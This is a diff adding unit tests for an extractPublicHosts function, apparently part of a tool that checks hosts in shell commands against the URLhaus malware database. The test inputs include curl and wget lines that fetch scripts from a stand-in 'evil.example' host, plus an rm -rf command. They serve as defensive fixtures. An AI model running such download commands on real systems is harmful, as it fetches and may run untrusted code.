@@ -1,6 +1,6 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { checkUrlhausHost } from "./urlhaus.ts";
+import { checkUrlhausHost, extractPublicHosts } from "./urlhaus.ts";
 
 const URLHAUS_URL = "https://urlhaus.abuse.ch/v1/host/";
 
@@ -85,4 +85,28 @@ test("invalid JSON -> null (silent degradation)", async () => {
   } finally {
     delete process.env.NMA_URLHAUS_KEY;
   }
+});
+
+test("extractPublicHosts: unique hosts, lowercased, port stripped", () => {
+  const hosts = extractPublicHosts(
+    "curl https://EVIL.example/x.sh && wget https://evil.example:8443/y && curl https://other.example/z",
+  );
+  assert.deepEqual(hosts.sort(), ["evil.example", "other.example"]);
+});
+
+test("extractPublicHosts: localhost, loopback and private IPs skipped", () => {
+  const cmd =
+    "curl http://localhost/a; curl http://127.0.0.1/b; curl http://10.0.0.1/c; " +
+    "curl http://192.168.1.1/d; curl http://172.16.0.1/e; curl http://169.254.1.1/f; " +
+    "curl https://listed.example/g";
+  assert.deepEqual(extractPublicHosts(cmd), ["listed.example"]);
+});
+
+test("extractPublicHosts: no URL -> empty, no work", () => {
+  assert.deepEqual(extractPublicHosts("rm -rf /tmp/x"), []);
+});
+
+test("extractPublicHosts: capped at 5 hosts", () => {
+  const cmd = Array.from({ length: 8 }, (_, i) => `curl https://h${i}.example/`).join("; ");
+  assert.equal(extractPublicHosts(cmd).length, 5);
 });
